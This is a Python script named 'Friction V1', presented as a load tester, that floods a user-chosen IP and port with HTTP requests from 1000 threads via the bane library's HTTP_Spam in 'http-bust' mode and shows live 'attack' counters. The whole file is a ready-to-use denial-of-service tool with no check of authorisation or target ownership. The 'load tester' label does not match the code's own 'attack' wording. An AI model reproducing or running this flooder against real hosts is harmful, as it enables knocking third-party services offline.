import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
import bane

init(autoreset=True)
BLUE = Fore.CYAN
RESET = Style.RESET_ALL

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def center_line(text, width=40):
    return text.center(width)

def print_gui_header():
    line = f"{BLUE}0o0--------< Friction >--------0o0{RESET}"
    print(line)
    print()
    print(center_line(f"{BLUE}Friction V1{RESET}"))
    print(center_line(f"{BLUE}--- LOAD TESTER ---{RESET}"))
    print(center_line(f"{BLUE}By @necuix{RESET}"))
    print()
    print(line)
    print()

def print_inputs_separator():
    print(f"{BLUE}Inputs:{RESET}")
    print(f"{BLUE}" + "-" * 40 + f"{RESET}")

def print_details(ip, port, method, duration):
    print(f"{BLUE}Target IPv4: {RESET}{ip}")
    print(f"{BLUE}Target Port: {RESET}{port}")
    print(f"{BLUE}Method (HTTP/HTTPS): {RESET}{method}")
    print(f"{BLUE}Duration (max 240s): {RESET}{duration}")

def http_flood(target_ip, target_port, method, duration, threads):
    flooder = bane.HTTP_Spam(
        target_ip,
        p=target_port,
        timeout=30,
        threads=threads,
        duration=duration,
        tor=False,
        logs=False,
        method="http-bust"
    )
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(flooder.start)
    monitor_attack(flooder)

def monitor_attack(flooder):
    print(f"\n{BLUE}Attack initiating....{RESET}\n")
    try:
        while True:
            time.sleep(1)
            sys.stdout.write(
                f"\r{BLUE}Live Traffic: {flooder.counter + flooder.fails} | "
                f"Success: {flooder.counter} | "
                f"Fails: {flooder.fails}{RESET}"
            )
            sys.stdout.flush()
            if flooder.done():
                break
    except KeyboardInterrupt:
        print(f"\n{BLUE}Attack interrupted by user.{RESET}")
    except Exception:
        pass
    print()  # Newline after attack

def get_user_input():
    print_inputs_separator()
    ip = input(f"{BLUE}Target IPv4: {RESET}").strip()
    port = input(f"{BLUE}Target Port: {RESET}").strip()
    method = input(f"{BLUE}Method (HTTP/HTTPS): {RESET}").strip().upper()
    duration = input(f"{BLUE}Duration (max 240s): {RESET}").strip()
    print(f"{BLUE}" + "-" * 40 + f"{RESET}")
    # Validation
    if not ip:
        print(f"{BLUE}Invalid IP. Please try again.{RESET}")
        return get_user_input()
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        print(f"{BLUE}Invalid port. Please enter a number between 1 and 65535.{RESET}")
        return get_user_input()
    if method not in ("HTTP", "HTTPS"):
        print(f"{BLUE}Invalid method. Only HTTP or HTTPS allowed.{RESET}")
        return get_user_input()
    if not duration.isdigit() or not (1 <= int(duration) <= 240):
        print(f"{BLUE}Invalid duration. Enter a number between 1 and 240.{RESET}")
        return get_user_input()
    return ip, int(port), method, int(duration)

def main():
    clear_screen()
    print_gui_header()
    ip, port, method, duration = get_user_input()
    print_details(ip, port, method, duration)
    print(f"{BLUE}" + "-" * 40 + f"{RESET}")
    print()  # Extra space before attack
    threads = 1000
    http_flood(ip, port, method, duration, threads)

if __name__ == "__main__":
    main()
    
    # Friction is a modern & advance load tester tool build by necuix
